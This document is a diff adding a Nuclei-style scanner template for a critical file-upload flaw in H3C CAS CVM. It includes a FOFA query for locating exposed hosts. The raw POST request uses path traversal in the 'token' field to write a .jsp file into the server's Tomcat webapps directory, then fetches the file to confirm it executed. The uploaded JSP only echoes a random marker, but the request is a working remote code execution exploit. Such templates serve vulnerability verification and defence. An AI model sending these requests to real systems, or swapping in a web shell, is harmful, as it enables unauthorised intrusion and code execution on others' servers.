@@ -1,0 +1,42 @@
+id: h3c-CAS-CVM-fd-uploadfile
+
+info:
+  name: h3c-CAS-CVM-fd-uploadfile
+  author: PokerSEC
+  severity: critical
+  metadata:
+    fofasearch: body="css/img/loginpage.png"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  flag: "{{to_lower(rand_base(10))}}"
+http:
+  - raw:
+      - |-
+        POST /cas/fileUpload/fd HTTP/1.1
+        Host: 
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryMMqEBbEFHlzOcYq4
+
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="token"
+
+        /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/png
+
+        <% out.println("{{flag}}");%>  
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4--
+
+      - |+
+        GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - status_code_1==200 && status_code_2==200 && contains_all(body_2,"{{flag}}")
